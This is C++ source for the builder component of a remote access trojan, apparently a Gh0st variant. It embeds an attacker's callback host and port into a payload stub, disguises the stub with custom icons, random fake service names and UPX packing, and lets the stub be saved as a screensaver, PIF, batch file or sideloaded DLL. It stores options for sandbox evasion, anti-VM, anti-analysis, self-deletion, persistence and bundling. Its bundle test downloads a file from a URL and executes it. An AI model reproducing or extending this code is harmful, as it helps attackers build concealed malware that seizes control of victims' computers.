		CFileDialog dlg(FALSE, "exe",strFileName,OFN_OVERWRITEPROMPT|OFN_EXPLORER,"可执行文件(*.exe)|*.exe|白加黑(*.dll)|*.dll|DOS快捷方式|*.pif|屏幕保护程序 (*.scr)|*.scr|批处理 (*.bat)|*.bat|DOS应用程序(*.com)|*.com|All Files (*.*)|*.*||",NULL);

		if(Baocun == "")
			dlg.m_ofn.lpstrInitialDir = BUILD;
		else
			dlg.m_ofn.lpstrInitialDir = Baocun;
		dlg.m_ofn.lpstrTitle="文件保存到";
		dlg.m_ofn.lStructSize=88;
		if(dlg.DoModal() == IDOK)
		{
			strcpy(szSaveFile, dlg.GetPathName());
		}
		else
		{
			m_edit_log.ReplaceSel( "\r\n生成已取消\r\n");
			return;
		}
		
		hFile = CreateFile( DatPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
		if ( hFile == INVALID_HANDLE_VALUE ) 
		{
			if (!((CClientApp *)AfxGetApp())->m_bIsWarning_Tone)
			{
				PlaySound(MAKEINTRESOURCE(IDR_WAVE_Dat),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
			}
			m_edit_log.ReplaceSel( "\r\n读取Dat文件错误\r\n");
			return;
		}
		else
		{
			m_edit_log.ReplaceSel( "\r\n读取Dat文件成功\r\n");
		}
		
		FileSize = GetFileSize( hFile, NULL );
		ExeBuff = (PCHAR)malloc(FileSize);
		memset( ExeBuff, 0, FileSize );
		ReadFile( hFile, ExeBuff, FileSize, &dwTmp, NULL );
		
		//这里读取到Dat的上线储存地址
		int moffset = memfind(ExeBuff, "SVP7", FileSize, 0);
		if (moffset == 0)
		{
			m_edit_log.ReplaceSel( "\r\n未读取到配置信息\r\n");
			return;
		}
		else
		{
			m_edit_log.ReplaceSel( "\r\n读取到配置信息,准备写入\r\n");
		}
		char	*lpszSlash = NULL;
		m_edit_log.ReplaceSel( "\r\n信息准备完成,开始写入\r\n");
		memcpy(ExeBuff+ moffset, &dll_info, sizeof(dll_info));//更新配置信息到内存数据
		CloseHandle(hFile);
		hFile = CreateFile( dlg.GetPathName(), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
		if ( hFile == INVALID_HANDLE_VALUE ) 
		{
			m_edit_log.ReplaceSel( "\r\n创建文件出错\r\n");
		}
		if(!WriteFile( hFile, ExeBuff, FileSize, &dwTmp, NULL ))
		{
			m_edit_log.ReplaceSel( "\r\n文件占用或被查杀\r\n");
		}
		else
		{
			m_edit_log.ReplaceSel( "\r\n---------配置成功---------\r\n");
			CloseHandle(hFile);
			free(ExeBuff);
			CString szTempTips;
			szTempTips.Format("\r\n文件路径\r\n%s",szSaveFile);
			m_edit_log.ReplaceSel(szTempTips+"\r\n");
			//生成图标
			CString szIconPath;
			GetDlgItemText(IDC_ICO,szIconPath);
			if (szIconPath!="")
			{
				char Pathss[MAX_PATH];
				char Pathee[MAX_PATH];
				sprintf(Pathss, "%s",szIconPath);
				sprintf(Pathee, "%s",szSaveFile);
				
				CMyToolsKit Dig;
				Dig.ChangeExeIcon(Pathss,Pathee);
			}
			if (m_upx)
			{	
				if(CompressUpx(szSaveFile))//UPX压缩
					m_edit_log.ReplaceSel("\r\n压缩成功...\r\n");
				else
					m_edit_log.ReplaceSel("\r\n压缩失败...\r\n");
			}
			PathRemoveFileSpec(szSaveFile);
		}
	}
	else
	{
		lstrcat(DatPath, "\\Cache\\Instdll.dat");
		if (GetFileAttributes(DatPath) == -1  )
		{
			m_edit_log.ReplaceSel( "\r\n\r\n没有找到多文件Dat\r\n");
			GetDlgItem(IDOK)->EnableWindow(FALSE);
		}
		else
		{
			m_edit_log.ReplaceSel( "\r\n\r\n准备就绪可以生成\r\n");
		}
		CFileDialog dlg(FALSE, "dll", "nw_elf.dll",OFN_OVERWRITEPROMPT|OFN_EXPLORER,"多文件(*.dll)|*.dll", NULL);
		if(Baocun == "")
			dlg.m_ofn.lpstrInitialDir = BUILD;
		else
			dlg.m_ofn.lpstrInitialDir = Baocun;
		dlg.m_ofn.lpstrTitle="文件保存到";
		dlg.m_ofn.lStructSize=88;
		if(dlg.DoModal () == IDOK)
		{
			strcpy(szSaveFile,dlg.GetPathName());
		}
		else
		{
			m_edit_log.ReplaceSel( "\r\n生成已取消\r\n");
			return;
		}
		hFile = CreateFile( DatPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
		if ( hFile == INVALID_HANDLE_VALUE ) 
		{
			if (!((CClientApp *)AfxGetApp())->m_bIsWarning_Tone)
			{
				PlaySound(MAKEINTRESOURCE(IDR_WAVE_Dat),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
			}
			m_edit_log.ReplaceSel( "\r\n读取Dat文件错误\r\n");
			return;
		}
		else
		{
			m_edit_log.ReplaceSel( "\r\n读取Dat文件成功\r\n");
		}
		FileSize = GetFileSize( hFile, NULL );
		ExeBuff = (PCHAR)malloc(FileSize);
		memset( ExeBuff, 0, FileSize );
		ReadFile( hFile, ExeBuff, FileSize, &dwTmp, NULL );
		//这里读取到Dat的上线储存地址
		int moffset = memfind(ExeBuff, "SVP7", FileSize, 0);
		if (moffset == 0)
		{
			m_edit_log.ReplaceSel( "\r\n未读取到配置信息\r\n");
			return;
		}
		else
		{
			m_edit_log.ReplaceSel( "\r\n读取到配置信息,准备写入\r\n");
		}
		char	*lpszSlash = NULL;
		m_edit_log.ReplaceSel( "\r\n信息准备完成,开始写入\r\n");
		memcpy(ExeBuff+ moffset, &dll_info, sizeof(dll_info));//更新配置信息到内存数据
		CloseHandle(hFile);
		hFile = CreateFile(dlg.GetPathName(), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
		if ( hFile == INVALID_HANDLE_VALUE ) 
		{
			m_edit_log.ReplaceSel( "\r\n创建文件出错\r\n");
		}
		
		if(!WriteFile( hFile, ExeBuff, FileSize, &dwTmp, NULL ))
		{
			m_edit_log.ReplaceSel( "\r\n文件占用或被查杀\r\n");
		}
		else
		{
			m_edit_log.ReplaceSel( "\r\n---------配置成功---------\r\n");
			CloseHandle(hFile);
			free(ExeBuff);
			CString szTempTips;
			szTempTips.Format("\r\n文件路径\r\n%s",szSaveFile);
			m_edit_log.ReplaceSel(szTempTips+"\r\n");
			if (m_upx)
			{	
				if(CompressUpx(szSaveFile))//UPX压缩
					m_edit_log.ReplaceSel("\r\n压缩成功...\r\n");
				else
					m_edit_log.ReplaceSel("\r\n压缩失败...\r\n");
			}
			PathRemoveFileSpec(szSaveFile);	
		}
	}
	//保存开关
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","FBC",m_fbc);
	if (m_fbc)
	{
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","FWB",m_fwb);  //反微步
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","FHB",m_fhb);  //反哈勃
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","FXN",m_fxn);  //反虚拟
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","FFX",m_ffx);  //防分析
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","FSC",m_fsc);  //防删除
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","FZS",m_fzs);  //自删除
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","FCF",m_fcf);  //防重复
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","FFH",m_ffh);  //注入复活
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","FCT",m_fct);  //内网穿透
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","FZJ",m_fzj);  //K终结者
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","FKB",m_fkb);  //捆绑开关
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","FSM",m_fsm);  //睡眠阻止
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","FLX",m_flx);  //离线记录
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","FWR",m_fwr);  //微软杀毒
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","UPX",m_upx);  //upx压缩
		((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "HOST",m_edit_host);//上线地址
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "PORT",m_edit_port);//端口
		((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build","Fenzu",Fenzu);  //上线分组
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","ZAzst",m_zrAzst);  //安装类型
		((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "DllName", m_DllName);  //安装名称
		((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "SVCNAME",m_service_name);//服务名称
		((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "DISNAME", m_service_displayname);//服务显示
		((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "SVCDES", m_service_description);//服务描述
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","InstallPath",m_remote_path.GetCurSel()); //安装路径
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","FileAttribute1",m_FileAttrbute.GetCurSel());//文件属性
		((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "URL",m_edit_kb);//捆绑
	}
	//保存路径
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build","BAOCUNEXE",szSaveFile);
}

void CBuildDlg::OnPaint() 
{
	CPaintDC dc(this); // device context for painting
	
	// TODO: Add your message handler code here

	// Do not call CDialog::OnPaint() for painting messages
}

void CBuildDlg::OnButtonTestConnect() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	if (m_edit_host.IsEmpty())
	{
		MessageBox("请填写上线地址...","提示...", MB_ICONINFORMATION);
		return;
	}
	GetDlgItem(IDC_BUTTON_TEST_CONNECT)->EnableWindow(FALSE);

	TestMaster(m_edit_host.GetBuffer(0),m_edit_port);

	GetDlgItem(IDC_BUTTON_TEST_CONNECT)->EnableWindow(TRUE);

}

void CBuildDlg::TestMaster(char * strIP,UINT nPort) 
{
	// TODO: Add your control notification handler code here
	WSADATA	wsaData;
	WSAStartup(0x0201, &wsaData);


	CString	strResult;
	CString	strResulr = "连接失败... ";
	bool	bRet = true;
	WSADATA	wsaData0;
	WSAStartup(0x0201, &wsaData0);
	
	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{ 
		::MessageBox(m_hWnd,"测试连接初始化失败... ","提示...", MB_ICONINFORMATION);
		return ;
	}
	// 设置socket为非阻塞
	u_long argp	= 1;
	ioctlsocket(sRemote, FIONBIO, &argp);
	
	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;
	
	hostent* pHostent = NULL;
	pHostent = gethostbyname(strIP);
	if (pHostent == NULL)
	{
		bRet = false;
		goto fail;
	}
	
	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	memset(&ClientAddr,0,sizeof(ClientAddr)); 
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(nPort);
	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));
	
	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);
	
	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{	
		bRet = false;
		goto fail;
	}
	
fail:
	closesocket(sRemote);
	WSACleanup();

	strResult.Format("域名/IP上线信息: \n域名 IP：%s  \n连接端口: %d ",strIP,nPort);
	if (bRet)
		strResulr = "连接成功... ";
	
	::MessageBox(m_hWnd,strResult,strResulr,MB_ICONINFORMATION);
}

//随机服务名
CHAR GetRandChar(BOOL  Capital,int i)
{
	DWORD iCount=GetTickCount()+i;
	
	iCount=(iCount+((CClientApp *)AfxGetApp())->GetRand())%25;
	
	CHAR Result=0;
	
	if(Capital)
		return	Result=65+iCount;
	else
		return  Result=97+iCount;
}

void CBuildDlg::OnRandom()
{
	// TODO: Add your control notification handler code here
	CHAR ServerName[20]={NULL};
	ZeroMemory(ServerName,20);

	for (int i=0;i<15;i++)
	{
		if(i==0)
		{
			ServerName[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==6||i==15)
		{
			ServerName[i]=' ';
			i++;
			ServerName[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerName[i]=GetRandChar(FALSE,i);
	}
	
	
	CHAR ServerShow[30]={NULL};
	ZeroMemory(ServerShow,30);
	
	for (i=0;i<29;i++)
	{
		if(i==0)
		{
			ServerShow[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==6||i==15||i==24)
		{
			ServerShow[i]=' ';
			i++;
			ServerShow[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerShow[i]=GetRandChar(FALSE,i);
	}
	

	CHAR ServerDesc[40]={NULL};
	ZeroMemory(ServerDesc,40);
	
	for (i=0;i<39;i++)
	{
		if(i==0)
		{
			ServerDesc[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==8||i==18||i==26||i==35)
		{
			ServerDesc[i]=' ';
			i++;
			ServerDesc[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerDesc[i]=GetRandChar(FALSE,i);
	}

	//随机安装名称
	CHAR szMyname[20]={NULL};
	ZeroMemory(szMyname,7);

	for (i=0;i<6;i++)
	{
		if(i==0)
		{
			szMyname[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==6||i==15)
		{
			szMyname[i]=' ';
			i++;
			szMyname[i]=GetRandChar(TRUE,i);
			continue;
		}
		szMyname[i]=GetRandChar(FALSE,i);
	}

	strcat(szMyname,".exe");
	SetDlgItemText(IDC_DLL_NAME,szMyname);
	SetDlgItemText(IDC_EDIT_SERVICE_NAME,ServerName);
	SetDlgItemText(IDC_EDIT_SERVICE_DISPLAYNAME,ServerShow);
	SetDlgItemText(IDC_EDIT_SERVICE_DESCRIPTION,ServerDesc);
}

BOOL CheckFileExist(LPCTSTR lpszPath)
{
	if ( GetFileAttributes(lpszPath) == 0xFFFFFFFF && GetLastError() == ERROR_FILE_NOT_FOUND ) {
		return FALSE;
	}else{
		return TRUE;
	}
}


bool OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 
	
	CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
	return TRUE;
	
}

void CBuildDlg::OnKbtest() 
{
    UpdateData(TRUE);
	int	nUrlLength;
	char	*lpURL = NULL;
	char szFile[512] = {0};
	char	*lpFileName = NULL;
	nUrlLength = m_edit_kb.GetLength();
	if (nUrlLength == 0)
	{
		AfxMessageBox("数据为空");
		return ;
	}
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, m_edit_kb.GetBuffer(0), nUrlLength + 1);
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
	{
		AfxMessageBox("无法获取文件名");
		return;
	}
	
	wsprintf(szFile,"c:\\%s",lpFileName );
	
	HRESULT hr = URLDownloadToFile(NULL,lpURL, szFile, 0, NULL);
	if ( hr == S_OK ) {
		if ( !CheckFileExist(szFile) )
		{
			AfxMessageBox("文件下载成功，但是文件不存在，很可能被杀毒软件查杀或者文件名出错");
			return ; 
		}
	}else if ( hr == INET_E_DOWNLOAD_FAILURE ) 
	{
		AfxMessageBox("URL 不正确，文件下载失败	");
		return ;    //URL 不正确，文件下载失败	
	}else
	{
		AfxMessageBox("文件下载失败，请检查URL是否正确	");
		return ; //文件下载失败，请检查URL是否正确
	}
    OpenFile(szFile,SW_SHOW);
	
}


void CBuildDlg::OnPattern() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	if (!Pattern)
	{
		Pattern = true;
		m_remote_path.SetCurSel(((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","InstallPath",10)); //安装路径
		GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(FALSE);
		GetDlgItem(IDC_CHECK2)->EnableWindow(FALSE);
		SetWindowText("服务生成 ->当前为多文件模式");
		if (!((CClientApp *)AfxGetApp())->m_bIsWarning_Tone)
		{
			PlaySound(MAKEINTRESOURCE(IDR_WAVE_SWITCH),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
		}
		LogOut("\r\n\r\n已切换当前模式为多文件\r\n\r\n\r\n\r\n");
	}
	else
	{
		Pattern = false;
		if(m_zraz)
			GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(FALSE);
		if(m_zraz1)
			GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(FALSE);
		if(m_zraz2) 
			GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(TRUE);
		GetDlgItem(IDC_CHECK2)->EnableWindow(TRUE);
		SetWindowText("服务生成 ->当前为单文件模式");
		if (!((CClientApp *)AfxGetApp())->m_bIsWarning_Tone)
		{
			PlaySound(MAKEINTRESOURCE(IDR_WAVE_SWITCH),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
		}
		LogOut("\r\n\r\n已切换当前模式为单文件\r\n\r\n\r\n\r\n");
	}
}
void CBuildDlg::OnSelectIco() 
{
	// TODO: Add your control notification handler code here
	GetModuleFileName(NULL, patht,MAX_PATH);   //获取程序自身完整路径名称,即Gh0st.exe的路径
	PathRemoveFileSpec(patht);//去除文件名中的gh0st
	char Path[MAX_PATH];
	sprintf(Path, "%s\\ICO",patht);
	CFileDialog dlg(TRUE, "ico", NULL, OFN_READONLY,"ico图标|*.ico||", NULL);
	dlg.m_ofn.lpstrInitialDir = Path;

	dlg.m_ofn.lpstrTitle= "选择ICO文件";
	if(dlg.DoModal() != IDOK)
		return;
	SetDlgItemText(IDC_ICO,dlg.GetPathName());
	HICON hIcon=(HICON)LoadImage(NULL, dlg.GetPathName(),IMAGE_ICON, 32, 32,LR_LOADFROMFILE);
   	m_Ico.SetIcon(hIcon);
//	DestroyIcon(hIcon); 
}
